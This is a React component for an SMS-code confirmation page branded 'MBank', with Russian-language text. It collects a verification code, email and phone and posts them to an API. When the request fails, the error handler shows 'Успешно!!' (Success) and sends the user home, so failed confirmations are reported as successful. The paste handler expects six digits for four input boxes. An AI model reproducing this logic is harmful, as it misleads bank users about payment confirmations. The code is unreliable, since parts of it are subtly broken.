import React, { useEffect, useRef, useState } from "react";
import "./PaymentCode.css";
import { useNavigate, useParams } from "react-router-dom";
import Header from "../../components/Header/Header";
import Loading from "../../components/UI/Loading/Loading";
import image from "../../img/mbank.webp";
import axios from "axios";
import { url } from "../../Api";

const PaymentCode = ({ Alert }) => {
  const { param } = useParams();
  const [loading, setLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState(["", "", "", ""]);
  const navigate = useNavigate();
  const inputRefs = useRef([]);

  const handleChange = (index, value) => {
    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    if (value.length === 1 && index < inputRefs.current.length - 1) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handlePaste = (e, index) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("Text").trim();
    if (pastedData.length === 6) {
      const newCode = [...code];
      for (let i = 0; i < 6; i++) {
        if (index + i < newCode.length) {
          newCode[index + i] = pastedData[i];
        }
      }
      setCode(newCode);
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && index > 0 && code[index] === "") {
      inputRefs.current[index - 1].focus();
    }
  };

  useEffect(() => {
    const savedEmail = localStorage.getItem("email");
    const savedPhone = localStorage.getItem("phone");
    if (savedEmail) {
      setEmail(savedEmail);
      setPhone(savedPhone);
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    let hasEmptyValue = false;
    code.forEach((digit) => {
      if (digit === "") {
        hasEmptyValue = true;
        return;
      }
    });
    if (hasEmptyValue) {
      const inputs = document.querySelectorAll(".input_form");
      inputs.forEach((input, index) => {
        if (code[index] === "") {
          input.classList.add("error");
        } else {
          input.classList.remove("error");
        }
      });
      setLoading(false);
      return;
    }
    const token = localStorage.getItem("token");
    try {
      const datas = {
        v_code: code.join(""),
        email: email,
        phone: phone,
      };
      const response = await axios.post(url + "", datas, {
        headers: { Authorization: `Token ${token}` },
      });
      if (response.data.response === true) {
        navigate("/");
      } else {
        const errorMessage = response.data.message || "Произошла ошибка";
        alert(errorMessage, "Ошибка");
      }
      setLoading(false);
    } catch (error) {
      navigate("/");
      Alert("Успешно!!", "success");
      setLoading(false);
    }
  };

  useEffect(() => {
    inputRefs.current.forEach((input, index) => {
      if (code[index] !== "" && input.classList.contains("error")) {
        input.classList.remove("error");
      }
    });
  }, [code]);

  return (
    <div className="payment_code">
      <Header>
        <h1>MBank</h1>
      </Header>
      <div className="container">
        <div className="center">
          <img className="image_payment" src={image} alt="" />
        </div>
        <h2>Введите код из SMS, чтобы подтвердить действие</h2>
        <p className="label_form">Код отправлен на номер {phone}</p>
        <div className="inputs">
          {code.map((digit, index) => (
            <input
              className="input_form"
              key={index}
              type="text"
              maxLength={1}
              max={1}
              value={digit}
              onChange={(e) => {
                if (/^\d*$/.test(e.target.value)) {
                  if (e.target.value.length === 1 || e.target.value === "") {
                    handleChange(index, e.target.value);
                  }
                }
              }}
              onKeyDown={(e) => handleKeyDown(e, index)}
              onPaste={(e) => handlePaste(e, index)}
              ref={(ref) => (inputRefs.current[index] = ref)}
            />
          ))}
        </div>
        <button
          disabled={loading}
          onClick={handleSubmit}
          className="button_form"
        >
          {loading ? <Loading color={"#fff"} /> : "Подтвердить"}
        </button>
      </div>
    </div>
  );
};

export default PaymentCode;
